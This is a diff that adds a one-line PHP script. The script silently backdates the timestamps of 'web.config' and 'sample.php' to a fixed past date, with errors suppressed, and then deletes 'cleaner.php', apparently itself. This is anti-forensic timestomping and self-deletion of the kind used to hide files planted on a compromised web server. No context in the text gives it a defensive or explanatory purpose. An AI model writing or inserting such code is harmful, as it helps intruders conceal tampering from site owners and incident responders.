@@ -1,0 +1,1 @@
+<?php @touch('web.config',1608283493,1608283493); @touch('sample.php',1608283493,1608283493); @unlink('cleaner.php');
